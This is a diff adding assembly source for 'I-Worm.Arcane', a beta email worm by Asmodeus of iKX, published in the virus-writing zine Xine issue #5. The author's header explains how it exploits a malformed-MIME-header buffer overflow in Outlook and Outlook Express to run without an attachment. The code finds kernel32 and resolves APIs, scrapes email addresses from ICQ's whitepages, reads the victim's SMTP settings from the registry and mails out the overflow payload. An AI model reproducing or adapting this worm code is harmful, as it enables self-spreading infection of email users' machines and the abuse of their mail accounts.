@@ -1,0 +1,1762 @@
+
+
+                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                                             ³ Xine - issue #5 - Phile 214 ³
+                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+
+
+
+;       Asmodeus of iKX proudly presents
+;               STACK-I-WORM
+;  ßÛßßÜ  ßÛßßÜ   ÜßßßÜ ßÛßßÜ  ßÛÜ   ßÜ ÜßÛßßßß
+;   Û   Û  Û   Û Û       Û   Û  Û Û   Û   Û
+;  ßÛßßßÛ ßÛßÛß  Û      ßÛßßßÛ  Û  Û  Û  ÜÛÜÜ
+;   Û   Û  Û  ßÜ Û       Û   Û  Û   Û Û ß Û
+;  Üß  Üß ß    ß ßÜÜÜÜß Üß  Üß Üß   ßÜß  ÜßÜÜÜÜ
+;               Lifeforce mysteria
+;
+;  Version : Beta 1.0
+;  Size    : 7424 bytes
+;
+;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;
+;   Features
+;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;   * Infects over email *without* attachment :>
+;   * Exploits buffer overflow (Malformed MIME header) in Outlook
+;   * Affected mail programs : Microsoft Outlook Express 4.0/4.01/5.0/5.01
+;     Microsoft Outlook 97/98/2000
+;   * "Affected" systems : Win9x/WinNT/Win2000
+;   * No binaries at all, everything excuted on stack and  RAM
+;   * Dynamic "smart" encryption/decryption engine 
+;   * Quasi Unlimited supply of emails (uses ICQ.COMs whitepages search)
+;
+;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;   Brief description
+;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;
+; While working with roach which were a pretty large project I got a bit
+; bored and wanted to code something small but effective that I always
+; wanted to code. Hence I came up with the idea of this little worm,
+; well frankly it has been on my mind for quite some time now.
+;    The idea is simple, how could I get arbitary code to execute on
+; someones computer without haveing to use an attachment? Well as this
+; isn't a pretty feature for any program you'd have to go "under-the-hood"
+; of some program and find a "loop-hole" which could be used. In this case
+; the "loop-hole" had already been discovered by a security group.
+; USSR Labs had already identified the buffer overrun condition in
+; all unpatched versions of Outlook (Express 5.1, 98, 2000 etc)
+; As most users have outlook installed and use it for recieving and
+; sending emails I though it would be an ideal way to reach them.
+; I have also thought about the remote network shares which could
+; also be used for an automated worm spread, but usually people doesn't
+; have a LAN on the PCs and so it will reach less hosts. Well enough
+; with motives, here is how it works :
+;
+; As the worm will be transfered over internet (email) it first checks
+; if there is an internet connection if not it will sleep some time and
+; then check for connection again. When an connection is detected it will
+; set up some sockets and then connect to ICQ.COM's whitepages and query
+; the server for some randomly selected people (random by language). It will
+; then extract their email adresses from the ICQ reply. It will then read the
+; windows registry (outlook settings) and check if there is an SMTP server
+; configured for the computer (as it only arrives on outlook computers, it's
+; most likly :>) if not found it will use it's static SMTP server. It will
+; also collect the users email adress. It then connects to SMTP server and
+; starts communicating with it. As the buffer overflow accures inside a routine
+; in the DLL called INETCOMM.DLL I must be sure there is no NULL, CR, LF
+; bytes in my code (routine/api often perform action/in this case copy to
+; buffer until they hit one of those bytes.) As the worm is kind of large
+; (for being a stack worm) I had to encrypt it. BUT there is very difficult
+; finding an encryption "scheme" manually that will produce a result
+; without NULL/CR/LF bytes. So the worm will do this itself before sending
+; itself away. It will allocate some memory then "brute-force" an encryption
+; by trying diffrent XOR/ADD combinations. When it finds a combination
+; that produces a valid result it sends away the buffer overflow bomb
+; with decryptor and worm attached to it. When someone who recieved
+; a worm email connects to their SMTP server and outlook starts downloading
+; their emails the buffer overflow kicks in BAAM! The decryptor recieves
+; control, decrypts and then jumps to the worm code. The worm allocates
+; some RAM and then roams into it. While in memory the spreading procedure
+; is repeated. When the windows session is terminated no traces are left
+; of the worm (except the mail on the smtp which never was deleted due to
+; unfinnished action of outlook). 
+; 
+
+.586p
+.model  flat
+
+include                 incs.inc ; Include files with some equotes and such.
+
+arcane_mem_size          equ arcane_mem_start-arcane_project       
+arcane_total_size        equ arcane_mem_end-arcane_project
+
+export_table            equ 120d
+nr_names                equ 24d
+exp_addtable            equ 28d
+exp_nametable           equ 32d
+exp_ordtable            equ 36d
+
+
+extrn   MessageBoxA:PROC
+extrn   ExitProcess:PROC
+
+;virussize  macro
+;           db      arcane_total_size/10000 mod 10 + "0"
+;           db      arcane_total_size/01000 mod 10 + "0"
+;           db      arcane_total_size/00100 mod 10 + "0"
+;           db      arcane_total_size/00010 mod 10 + "0"
+;           db      arcane_total_size/00001 mod 10 + "0"
+;           endm
+
+call_   macro   arcane_api
+        call    dword ptr [ebp+arcane_api]
+        endm
+
+.data
+
+junk_data    db "[I-Worm.Arcane by Asmodeus iKX]",0
+
+.code
+
+
+arcane_project:
+
+;int     3h
+
+call    get_first_delta
+
+get_first_delta:                               ; return address
+pop     ebp                                    ; put return address in EBP
+sub     ebp,offset get_first_delta             ; substract the "hardcoded" offset
+
+
+call    get_k32add                      
+mov     eax,dword ptr [ebp+k32base]
+test    eax,eax
+je      exit_worm
+
+call    get_all_apis
+inc     eax
+jz      exit_worm
+dec     eax
+
+xor     edx,edx
+push    arcane_total_size
+push    edx
+call_   arcane_GlobalAllocA 
+mov     dword ptr [ebp+arcane_mem],eax 
+lea     esi,[ebp+arcane_project]
+mov     ecx,arcane_total_size
+mov     edi,eax
+cld
+rep     movsb
+add     eax,arcane_mem_size
+jmp     eax
+
+arcane_mem_start:
+
+call    delta_offset
+
+call    generate_decryptor
+
+;push    0
+;lea     eax,[ebp+arcane_msg_caption]
+;push    eax
+;lea     eax,[ebp+arcane_msg_info]
+;push    eax
+;push    0
+;call_   arcane_MessageBoxA
+
+jmp     check_state
+
+inet_state:
+
+push    (60*(1*1000)) ; 60 sec
+call_   arcane_Sleep
+
+check_state:
+
+push    0
+lea     eax, [ebp+inet_dword]
+push    eax
+call_   arcane_InternetGetConnectedState
+dec     eax
+jnz     inet_state
+
+call    love_works
+
+
+int     3h
+
+call    empty_buffers
+
+jmp     inet_state
+
+
+exit_worm:
+
+
+push    0
+call_   arcane_ExitProcessA                          
+
+empty_buffers:
+lea     edi,[ebp+smtp_email_s]
+mov     ecx,100d
+xor     eax,eax
+rep     stosb
+
+lea     edi,[ebp+smtp_rcpt_email]
+mov     ecx,100d
+xor     eax,eax
+rep     stosb
+ret
+
+;smtp_email_s
+;smtp_rcpt_email
+
+
+love_works:
+
+call    delta_offset
+
+lea     eax,[ebp+wsa_data]
+push    eax
+push    VERSION1_1                      ; We want to use winsock ver 1.1
+call_   arcane_WSAStartup                ; Start up winsocks
+test    eax,eax                         ; ERROR?
+jne     close_wsa                       ; if so bail out
+
+call    create_socket                   ; call routine to generate a socket
+inc     eax                             ; if fail (-1) and increase we get
+test    eax,eax                         ; zero in return, true?
+je      close_up                        ; if so close up socket
+dec     eax                             ; if not restore value
+mov     dword ptr [ebp+send_socket],eax ; save the handle of our socket
+
+call    create_socket                   ; call routine to generate a socket
+inc     eax                             ; if fail (-1) and increase we get
+test    eax,eax                         ; zero in return, true?
+je      close_up                        ; if so close up socket
+dec     eax                             ; if not restore value
+mov     dword ptr [ebp+smtp_socket],eax ; save the handle of our socket
+
+
+call    create_socket                   ; call routine to generate a socket
+inc     eax                             ; if fail (-1) and increase we get
+test    eax,eax                         ; zero in return, true?
+je      close_up                        ; if so close up socket
+dec     eax                             ; if not restore value
+mov     dword ptr [ebp+icq_socket],eax  ; save the handle of our socket
+
+lea     edi,[ebp+icq_sock_addr_in]      ; ESI = structure of socket
+lea     ebx,[ebp+smtp_sock_addr_in]
+
+push    dword ptr [ebp+icqserver_port]                  ; Port in decimal
+call_   arcane_htons                     ; convert it to big endian
+                                        ; format (hex n reversed)
+mov     word ptr [edi+2d],ax            ; fill PORT in structure
+mov     word ptr [ebp+icqserver_port_s],ax  ; save it also...
+
+push    dword ptr [ebp+smtpserver_port] 
+call_   arcane_htons                     
+                                
+mov     word ptr [ebx+2d],ax    
+mov     word ptr [ebp+smtpserver_port_s],ax 
+
+call    get_host_ip                     ; call routine to fetch user IP
+
+lea     edi,[ebp+icq_sock_addr_in]   
+lea     ecx,[ebp+smtp_sock_addr_in]
+
+mov     word ptr [edi],AF_INET   
+mov     word ptr [ecx],AF_INET   
+
+mov     dword ptr [edi+4],ebx  
+mov     dword ptr [ecx+4],edx
+
+xor     eax,eax                             ; EAX = empty :D
+mov     ax,word ptr [ebp+icqserver_port_s]
+mov     word ptr [edi+2d],ax           
+mov     ax,word ptr [ebp+smtpserver_port_s]
+mov     word ptr [ecx+2d],ax  
+
+
+icq_part:
+
+;int     3h
+
+; icq languages
+;12 = english
+;19 = german
+;27 = japanese
+;29 = Korean
+;43 = spanish
+;45 = swedish
+;59 = max
+
+mov     eax,100d                          ; value to align with (0-9)
+call    get_rnd_range                   ; call randomization routine
+cmp     eax,50d
+jae     use_english
+
+mov     eax,5d                          ; value to align with (0-9)
+call    get_rnd_range                   ; call randomization routine
+
+xor     ebx,ebx                         ; reset EBX
+mov     ebx,30h                         ; 30h = "0"+ 0-9
+add     ebx,eax                         ; generate a digit with random base
+
+lea     edi,[ebp+icq_lan]               ; EDI = pointer to command
+xor     eax,eax
+xchg    eax,ebx
+stosb
+
+get_lan_again:
+mov     eax,9d
+call    get_rnd_range    
+test    eax,eax
+jz      get_lan_again
+
+xor     ebx,ebx  
+mov     ebx,30h  
+add     ebx,eax  
+
+lea     edi,[ebp+icq_lan]               ; EDI = pointer to command
+add     edi,1d
+xor     eax,eax
+xchg    eax,ebx
+stosb
+jmp     cont_icq
+
+use_english:
+xor     eax,eax
+mov     ax,"21"
+lea     edi,[ebp+icq_lan]
+stosw
+
+cont_icq:
+
+xor     edx,edx
+push    icq_mem_size
+push    edx
+call_   arcane_GlobalAllocA 
+mov     dword ptr [ebp+icq_mem],eax 
+
+
+lea     edi,[ebp+icq_sock_addr_in]      ; EDI = socket structure
+push    sock_addr_in_len                ; 16 bytes.. (size of structure)
+push    edi                             
+push    dword ptr [ebp+icq_socket]      ; handle of our socket
+call_   arcane_connect                   ; create a socket stream! (connect)
+test    eax,eax                         ; no problem, right?
+jne     close_up_icq                    ; fuck! close it up :(
+
+mov     ecx,icq_post_len                ; lenght of command to send
+lea     eax,[ebp+icq_post]              ; EAX = pointer to adress
+
+push    0h
+push    ecx
+push    eax
+push    dword ptr [ebp+icq_socket]
+call_   arcane_send
+
+xor     eax,eax
+mov     ebx,[ebp+icq_mem]               ; EBX = pointer to connection buffer
+call    clear_buffer                    ; routine to clear the buffer
+
+icq_recv_loop:
+
+;INPUT:
+;EAX = FD_SET structure
+;ECX = microseconds to sleep
+pushad
+mov     edx,dword ptr [ebp+icq_socket]
+lea     eax,[ebp+fd_set]
+mov     dword ptr [eax+4],edx
+lea     ecx,[ebp+time_to_live]
+call    to_sleep
+test    eax,eax
+jne     close_up_icq
+popad
+
+add     ebx,eax
+push    0h                              ;
+push    2000d                           ; Size of buffer
+push    ebx                             ; Pointer to buffer
+push    dword ptr [ebp+icq_socket]      ; socket to recieve data from
+call_   arcane_recv                      ; receive data!
+inc     eax
+jz      close_up_icq
+dec     eax
+mov     edx,ebx
+add     edx,eax
+cmp     dword ptr [edx-7], "th/<"
+jne     icq_recv_loop
+
+close_up_icq:
+
+push    dword ptr [ebp+icq_socket]         ; handle of socket to close
+call_   arcane_closesocket                  ; close the socket
+
+xor     edx,edx
+push    4000d
+push    edx
+call_   arcane_GlobalAllocA 
+mov     dword ptr [ebp+email_mem],eax 
+
+
+mov     esi,[ebp+icq_mem]  
+mov     edi,eax
+xor     edx,edx
+mov     ecx,icq_mem_size
+email_loop_1:
+;<a href="mailto:bobmarotte@netscape.net">
+cmp     dword ptr [esi], ":otl"
+je      found_address
+inc     esi
+loop    email_loop_1
+jmp     no_emails
+found_address:
+add     esi,4
+sub     ecx,4
+cmp     byte ptr [esi], '"'
+je      email_loop_1
+push    esi
+push    ecx
+valid_check:
+inc     esi
+cmp     byte ptr [esi], "@"
+jne     valid_check
+inc     esi
+dec     ecx
+cmp     dword ptr [esi], "egap"
+je      failed_valid
+pop     ecx
+pop     esi
+jmp     copy_address
+failed_valid:
+pop     ebx
+pop     eax
+jmp     email_loop_1
+copy_address:
+lodsb
+stosb
+dec     ecx
+cmp     byte ptr [esi], '"'
+jne     copy_address
+xor     eax,eax
+mov     al,":"
+stosb
+jmp     email_loop_1
+
+no_emails:
+xor     eax,eax
+mov     al,";"
+stosb
+
+int     3h
+
+push    0
+lea     eax,[ebp+arcane_msg_caption]
+push    eax
+mov     eax,dword ptr [ebp+email_mem]
+push    eax
+push    0
+call_   arcane_MessageBoxA
+
+lea     edi,[ebp+smtp_sock_addr_in]  
+push    sock_addr_in_len             
+push    edi                             
+push    dword ptr [ebp+smtp_socket]   
+call_   arcane_connect                
+test    eax,eax                      
+jne     close_up_smtp
+
+call    smtp_recv
+
+lea     eax,[ebp+smtp_cmd_helo]
+xor     edx,edx
+call    smtp_send
+
+call    smtp_recv
+
+lea     edi,[ebp+smtp_email_s]
+cmp     byte ptr [edi], 0
+jne     proper_email
+
+xor     eax,eax
+mov     eax,8d
+push    edi
+call    get_rnd_range
+pop     edi
+
+imul    eax,eax,5d
+lea     esi,[ebp+name_table1]
+add     esi,eax
+lodsd
+stosd
+xor     eax,eax
+mov     eax,8d
+
+push    edi
+call    get_rnd_range
+pop     edi
+
+imul    eax,eax,8d
+lea     esi,[ebp+name_table2]
+add     esi,eax
+lodsd
+stosd
+lodsw
+stosw
+lodsb
+stosb
+mov     eax,"toh@"
+stosd
+mov     eax,"liam"
+stosd
+mov     eax,"moc."
+stosd
+
+proper_email:
+
+lea     eax,[ebp+smtp_cmd_mailfrom]
+xor     edx,edx
+call    smtp_send
+
+call    smtp_recv
+
+rcptto_loop:
+
+mov     esi,dword ptr [ebp+email_mem]
+cmp     byte ptr [esi+10d], 0
+je      close_up_smtp
+
+clear_email_var:
+lea     edi,[ebp+smtp_rcpt_email]
+push    edi
+mov     ecx,100d
+xor     eax,eax
+rep     stosb
+pop     edi
+smtp_copy_email:
+cmp     byte ptr [esi], ":"
+je      smtp_get_next
+lodsb
+stosb
+jmp     smtp_copy_email
+smtp_get_next:
+inc     esi
+
+push    esi
+lea     eax,[ebp+smtp_cmd_rcptto]
+xor     edx,edx
+call    smtp_send
+
+call    smtp_recv
+
+pop     esi
+
+cmp     byte ptr [esi], ";"
+je      smtp_rctp_fin
+
+jmp     clear_email_var
+
+smtp_rctp_fin:
+
+
+lea     eax,[ebp+smtp_cmd_data]
+xor     edx,edx
+call    smtp_send
+
+call    smtp_recv
+
+;lea     eax,[ebp+smtp_cmd_bodyfrom]
+;xor     edx,edx
+;call    smtp_send
+;
+;lea     eax,[ebp+smtp_cmd_bodysubject]
+;xor     edx,edx
+;call    smtp_send
+
+;lea     eax,[ebp+smtp_cmd_bodyto]
+;xor     edx,edx
+;call    smtp_send
+
+; [send buffer overflow engineered virus-bomb]
+call    smtp_send_bomb
+
+mov     ecx,1d
+lea     eax,[ebp+null_byte]
+call    send_command                
+
+lea     eax,[ebp+mime_ctrl]
+mov     edx,1d
+call    smtp_send
+
+lea     eax,[ebp+smtp_cmd_bodydot]
+xor     edx,edx
+call    smtp_send
+
+call    smtp_recv
+
+lea     eax,[ebp+smtp_cmd_bodyquit]
+xor     edx,edx
+call    smtp_send
+
+call    smtp_recv
+
+push    dword ptr [ebp+smtp_socket]
+call_   arcane_closesocket           
+
+close_up_smtp:
+
+
+exit_gpc:
+
+close_up:
+
+push    dword ptr [ebp+send_socket]         ; handle of socket to close
+call_   arcane_closesocket                     ; close the socket
+
+close_wsa:
+
+call_   arcane_WSACleanup                      ; Reset the WSA
+
+; return to worm main routine
+xor     eax,eax
+ret
+
+get_host_ip:
+
+push    260d  
+lea     eax,[ebp+current_host]
+push    eax
+call_   arcane_gethostname 
+
+call    get_smtp_name
+lea     eax,[ebp+smtp_server_s]
+
+push    eax
+call_   arcane_gethostbyname   
+test    eax,eax               
+je      error_smtp_ip
+mov     esi,dword ptr [eax+12]
+lodsd                         
+mov     eax,dword ptr [eax]   
+mov     dword ptr [ebp+smtp_ip],eax
+jmp     done_smtp_ip
+error_smtp_ip:
+xor     eax,eax
+mov     dword ptr [ebp+smtp_ip],eax
+
+done_smtp_ip:
+
+do_icq:
+
+lea     eax,[ebp+icq_server_name]
+push    eax
+call_   arcane_gethostbyname                   ; Get the IP of this domain name
+test    eax,eax                         ; error ?
+je      error_icq_ip                        ; blah! get out of here
+mov     esi,dword ptr [eax+12]          ; ESI = Pointer to table in  hostent
+lodsd                                   ; EAX = Pointer to IP
+mov     eax,dword ptr [eax]             ; EAX = IP
+mov     dword ptr [ebp+icq_ip],eax
+
+error_icq_ip:
+mov     ebx,dword ptr [ebp+icq_ip]
+mov     edx,dword ptr [ebp+smtp_ip]
+ret
+
+get_smtp_name:
+
+lea     edi,[ebp+smtp_server_s]
+mov     ecx,100d
+xor     eax,eax
+cld
+rep     stosb
+
+lea     edi,[ebp+smtp_email_s]
+mov     ecx,100d
+xor     eax,eax
+cld
+rep     stosb
+
+lea     eax,[ebp+regkey_handle]
+push    eax
+lea     eax,[ebp+subkey_location_1]
+push    eax
+push    HKEY_LOCAL_MACHINE
+call_   arcane_RegCreateKeyA
+
+lea     eax,[ebp+subkey_len]
+push    eax
+lea     eax,[ebp+subkey_location_2+53d]
+push    eax
+lea     eax,[ebp+key_type]
+push    eax
+push    0
+lea     eax,[ebp+default_account]
+push    eax
+push    dword ptr [ebp+regkey_handle]
+call_   arcane_RegQueryValueExA
+;test    eax,eax
+;jnz     no_outlook
+
+push    dword ptr [ebp+regkey_handle]
+call_   arcane_RegCloseKey 
+
+
+lea     eax,[ebp+regkey_handle]
+push    eax
+lea     eax,[ebp+subkey_location_2]
+push    eax
+push    HKEY_LOCAL_MACHINE
+call_   arcane_RegCreateKeyA
+;test    eax,eax
+;jnz     no_outlook
+
+
+lea     edi,[ebp+smtp_server_s]
+lea     esi,[ebp+smtp_server]
+mov     dword ptr [ebp+smtp_account_len],100d
+call    get_account_info
+;test    eax,eax
+;jnz     no_outlook
+
+lea     edi,[ebp+smtp_email_s]
+lea     esi,[ebp+smtp_email]
+mov     dword ptr [ebp+smtp_account_len],100d
+call    get_account_info
+;test    eax,eax
+;jnz     no_outlook
+
+lea     edi,[ebp+smtp_server_s]
+cmp     byte ptr [edi], 0
+jne     no_outlook
+
+lea     esi,[ebp+smtp_server_static]
+mov     ecx,smtp_server_static_len
+cld
+rep     movsb
+
+no_outlook:
+
+push    dword ptr [ebp+regkey_handle]
+call_   arcane_RegCloseKey 
+lea     eax,[ebp+smtp_server_s]
+ret
+
+get_account_info:
+lea     eax,[ebp+smtp_account_len]
+push    eax
+push    edi
+lea     eax,[ebp+key_type]
+push    eax
+push    0
+push    esi
+push    dword ptr [ebp+regkey_handle]
+call_   arcane_RegQueryValueExA
+ret
+
+clear_buffer:
+pushad                                   ; Save all registers
+mov     edi,ebx                          ; EDI = EBX = pointer to buffer
+mov     ecx,300h                         ; size of buffer (real size)
+xor     eax,eax                          ; empty EAX
+rep     stosb                            ; empty buffer
+popad                                    ; restore all registers
+ret
+
+create_socket:
+push    PCL_NONE                        ; No protocol
+push    SOCK_STREAM                     ; A socket stream connection
+push    AF_INET                         ; AF_INET the only one for use
+call_   arcane_socket                          ; Create socket
+ret
+
+smtp_send_bomb:
+
+int     3h
+
+push    150d
+lea     eax,[ebp+date_buffer]
+add     eax,6d
+push    eax
+lea     eax,[ebp+date_format]
+push    eax
+push    0
+push    0
+push    dword ptr [ebp+english_lcid]
+call    arcane_GetDateFormatA
+add     eax,6d
+mov     edx,eax
+
+lea     edi,[ebp+date_buffer]
+add     edi,edx
+dec     edi
+xor     eax,eax
+mov     al, " "
+stosb
+
+
+push    150d
+lea     eax,[ebp+date_buffer]
+add     eax,edx
+push    eax
+lea     eax,[ebp+time_format]
+push    eax
+push    0
+push    0
+push    0
+call_   arcane_GetTimeFormatA
+
+
+lea     eax,[ebp+bomb_bytes]
+push    eax
+lea     eax,[ebp+date_buffer]
+push    eax
+call_   arcane_lstrcatA
+
+lea     eax,[ebp+date_buffer]
+push    eax
+call_   arcane_lstrlenA
+
+mov     ecx,eax
+lea     eax,[ebp+date_buffer]
+call    send_command                
+
+;mov     ecx,second_wave_len         
+;lea     eax,[ebp+second_wave]       
+;call    send_command                
+
+
+;mov     ecx,decryptor_len
+;lea     eax,[ebp+decryptor_start]
+;call    send_command              
+
+;mov     ecx,arcane_total_size
+;mov     eax,dword ptr [ebp+arcane_cryptmem]
+;call    send_command              
+
+ret
+
+to_sleep:
+;INPUT:
+;EAX = FD_SET structure
+;ECX = microseconds to sleep
+;OUTPUT:
+;EAX = -1 on fail
+;EAX = 0 on success
+
+shit_loop:
+push    ecx
+push    0
+push    0
+push    eax
+push    sock_addr_in_len
+call_   arcane_select 
+inc     eax
+jz      time_out
+dec     eax
+cmp     eax,1
+je      got_data
+lea     edi,[ebp+fd_set]
+mov     dword ptr [edi],1d
+jmp     shit_loop
+
+time_out:
+xor     eax,eax
+dec     eax
+ret
+got_data:
+xor     eax,eax
+ret
+
+
+smtp_send:
+
+push    eax
+
+test    edx,edx
+je      no_ctrl
+
+mov     edi,eax
+xor     eax,eax
+mov     ecx,10d
+rep     stosb
+pop     eax
+push    eax
+
+no_ctrl:
+
+push    eax                  
+call_   arcane_lstrlenA       
+mov     ecx,eax
+pop     eax
+
+push    eax
+mov     edi,eax
+add     edi,ecx
+cmp     word ptr [edi-2],0a0dh
+je      done_ctrl
+xor     eax,eax
+mov     eax,0a0dh
+stosw
+jmp     all_ctrl_done
+done_ctrl:
+pop     eax
+jmp     mega_ctrl_fin
+all_ctrl_done:
+pop     eax
+add     ecx,2d
+mega_ctrl_fin:
+push    0h
+push    ecx
+push    eax
+push    dword ptr [ebp+smtp_socket]
+call_   arcane_send
+ret
+
+smtp_recv:
+xor     eax,eax
+lea     ebx,[ebp+con_buffer]        
+call    clear_buffer                
+
+push    0h                          
+push    200h                        
+push    ebx                         
+push    dword ptr [ebp+smtp_socket] 
+call_   arcane_recv                
+ret
+
+; Thanks to Billy Belcebu/iKX for the random range generator!!!
+
+random  proc
+
+push    ecx
+push    edx                             
+mov     eax,dword ptr [ebp+rnd32_seed]
+mov     ecx,eax
+imul    eax,41C64E6Dh
+add     eax,00003039h
+mov     dword ptr [ebp+rnd32_seed],eax
+xor     eax,ecx
+pop     edx
+pop     ecx
+ret
+random  endp
+
+
+get_rnd_range proc
+push    ecx
+push    edx
+mov     ecx,eax
+call    random
+xor     edx,edx
+div     ecx
+mov     eax,edx  
+pop     edx
+pop     ecx
+ret
+get_rnd_range endp
+
+
+
+send_command:
+push    0h
+push    ecx
+push    eax
+push    dword ptr [ebp+send_socket]
+call_   arcane_send
+ret
+
+
+
+return_error:
+mov     eax,-1
+ret
+
+
+
+
+
+get_k32add:
+
+
+; INPUT :
+; EAX = return address somwhere inside kernel32.dll
+; OUTPUT :
+; EAX = Imagebase of kernel32.dll
+; ON ERROR :
+; EAX = 0
+
+
+pushad                        
+lea     eax,[ebp+winnt_add]   
+push    eax                   
+push    dword ptr fs:[0]      
+mov     fs:[0],esp            
+
+mov     eax, 0BFF70000h
+call    check_k32add
+
+mov     dword ptr [ebp+k32base],eax      ; save kernel32.dll imagebase
+
+
+pop     dword ptr fs:[0]   
+add     esp,4              
+popad                      
+
+ret
+
+
+winnt_add:
+
+mov     esp, dword ptr [esp+8]       
+pop     dword ptr fs:[0]             
+add     esp,4                        
+popad                                
+
+pushad
+lea     eax,[ebp+win2000_add]   
+push    eax                   
+push    dword ptr fs:[0]      
+mov     fs:[0],esp            
+
+mov     eax, 077F00000h
+call    check_k32add
+
+mov     dword ptr [ebp+k32base],eax      ; save kernel32.dll imagebase
+
+pop     dword ptr fs:[0]
+add     esp,4              
+popad                      
+
+ret
+
+win2000_add:
+
+mov     esp, dword ptr [esp+8]
+pop     dword ptr fs:[0]             
+add     esp,4                        
+popad                                
+
+pushad
+lea     eax,[ebp+error_add]   
+push    eax                   
+push    dword ptr fs:[0]      
+mov     fs:[0],esp            
+
+mov     eax, 077E80000h
+call    check_k32add
+
+mov     dword ptr [ebp+k32base],eax      ; save kernel32.dll imagebase
+
+pop     dword ptr fs:[0]
+add     esp,4              
+popad                      
+
+ret
+
+error_add:
+
+mov     esp, dword ptr [esp+8]
+pop     dword ptr fs:[0]             
+add     esp,4                        
+popad                                
+
+xor     eax,eax
+ret
+
+
+check_k32add:
+mov     ecx,5d                                   ; scan 5 pages down MAX
+get_kerneladd:                                   ;
+cmp     word ptr [eax],"ZM"                      ; an EXE?
+je      found_k32base                            ; if so we got kernel32
+sub     eax,10000h                               ; go down 1 page
+loop    get_kerneladd                            ; go deeper underground :)
+xor     eax,eax                                  ; if not found EAX = 0 :)
+ret
+found_k32base:
+ret
+
+get_specific_api:
+; INPUT :
+; EDI = pointer to ascii name of API
+; ESI = points to start of export table/name table
+; ECX = size of wanted API
+; K32BASE = Imagebase of DLL to get API from (default kernel32.dll)
+; OUTPUT :
+; EAX = address of API
+; ON ERROR :
+; EAX = -1
+
+push    esi                                      ; Save pointer to name table
+push    ecx                                      ; Save size of API
+push    edi                                      ; Save pointer to API 
+mov     esi,dword ptr [esi]                      ; Get name pointer from name
+add     esi,dword ptr [ebp+k32base]              ; table, and normalize it.
+cld                                              ; clear direction flag
+rep     cmpsb                                    ; Compare EDI with ESI
+pop     edi                                      ; restore pointer to API
+pop     ecx                                      ; restore API size
+jz      found_api                                ; zero flag set? API found!
+dec     dword ptr [ebp+nr_names_]                    ; if not decrease nr names
+cmp     dword ptr [ebp+nr_names_],0                  ; check if all been compared
+pop     esi                                      ; restore pointer to name
+jbe     api_error                                ; table..
+add     esi,4                                    ; get next pointer in array
+inc     edx                                      ; increase counter of apis
+jmp     get_specific_api                         ; go get next api!
+
+found_api:
+pop     esi                                      ; fix stack...
+
+xor     eax,eax                                  ; empty EAX
+imul    edx,edx,2d                               ; multiply API # with 2
+mov     esi,dword ptr [ebp+ordtable_]            ; get ordinal table
+add     esi,edx                                  ; add API # (in words)
+lodsw                                            ; fetch API oridinal
+mov     esi,dword ptr [ebp+addtable_]            ; ESI = address table
+imul    eax,eax,4d                               ; convert ordinal into dword
+add     esi,eax                                  ; ESI = pointer to API address
+lodsd                                            ; EAX = RVA address of API!
+add     eax,dword ptr [ebp+k32base]              ; EAX = VA address of API!
+ret
+
+api_error:                                       
+mov     eax,-1                                   ; On error return -1
+ret
+
+get_apis_from_dll:
+inc     esi                                      ; 
+
+push    esi                                      ; API we want (address of)
+push    ebx                                      ; DLL to get from
+call_   arcane_GetProcAddress                    ; Get it!
+test    eax,eax                                  ; error?
+je      got_all_apis
+stosd                                            ; write EAX -> EDI
+parse_api_list:
+inc     esi                                      ; increase it...
+cmp     byte ptr [esi],0                         ; check if end of API 
+je      get_apis_from_dll                        ; (NULL terminator)
+cmp     byte ptr [esi],0ffh                      ; check if end of API
+je      got_all_apis                             ; list.
+jmp     parse_api_list
+
+got_all_apis:
+ret
+
+
+get_all_apis:
+
+mov     ebx, [eax+3ch]                   ; RVA to PE header
+add     ebx,eax                          ; VA to PE header
+cmp     word ptr [ebx], "EP"             ; is it a valid PE file?
+jne     api_failure
+
+mov     ebx, [ebx+export_table]          ; EBX = RVA Export directory
+add     ebx, dword ptr [ebp+k32base]     ; EBX = VA Export directory
+
+mov     eax,dword ptr [ebx+nr_names]     ; EAX = RVA # of names (in export)
+add     eax,dword ptr [ebp+k32base]          ; EAX = VA # of names (in export)
+mov     dword ptr [ebp+nr_names_],eax    ; save it for later use
+
+mov     eax,dword ptr [ebx+exp_addtable] ; EAX = RVA of address table
+add     eax,dword ptr [ebp+k32base]          ; EAX = VA of address table
+mov     dword ptr [ebp+addtable_],eax    ; save it...
+
+mov     eax,dword ptr [ebx+exp_ordtable] ; EAX = RVA of ordinals table
+add     eax,dword ptr [ebp+k32base]          ; EAX = VA of ordinals table
+mov     dword ptr [ebp+ordtable_],eax    ; save it...
+
+xor     edx,edx                           ; EDX = 0
+mov     esi,dword ptr [ebx+exp_nametable] ; ESI = RVA of names table
+add     esi,dword ptr [ebp+k32base]                 ; ESI = VA of names table
+lea     edi,[ebp+getproc_api]             ; EDI = points to GetP... API
+mov     ecx,(getproc_api_len-1)           ; ECX = lenght of -||-... API
+call    get_specific_api
+cmp     eax,-1                            ; Did we find it? 
+je      api_failure
+mov     dword ptr [ebp+arcane_GetProcAddress],eax    ; Save address of GetProc
+                                                    ; Address API
+mov     ebx,dword ptr [ebp+k32base]                 ; DLL we want to look for
+lea     esi,[ebp+first_k32api]                      ; API in... ESI =
+dec     esi                                         ; poiter to first API
+lea     edi,[ebp+arcane_k32api_store]                ; in api list..EDI =
+call    get_apis_from_dll                           ; pointer to where all
+
+                      
+lea     eax, [ebp+wns32_dll]                        ; ptr "WNSOCK32.dll",0
+push    eax
+call_   arcane_LoadLibraryA                          ; Get address! 
+
+mov     ebx,eax                                     ; EAX = EBX = DLL address 
+lea     esi,[ebp+first_wns32api]                    ; ptr first winsock api
+dec     esi                    
+lea     edi,[ebp+arcane_wns32api_store]              ; where to store address
+call    get_apis_from_dll                           ; GET 'EM!
+
+lea     eax, [ebp+wninet_dll]                       ; ptr "",0
+push    eax
+call_   arcane_LoadLibraryA                          ; Get address! 
+
+mov     ebx,eax                                     ; EAX = EBX = DLL address
+lea     esi,[ebp+first_wninetapi]                   ; ptr first winsock api
+dec     esi                    
+lea     edi,[ebp+arcane_wninetapi_store]             ; where to store address
+call    get_apis_from_dll                           ; GET 'EM!
+
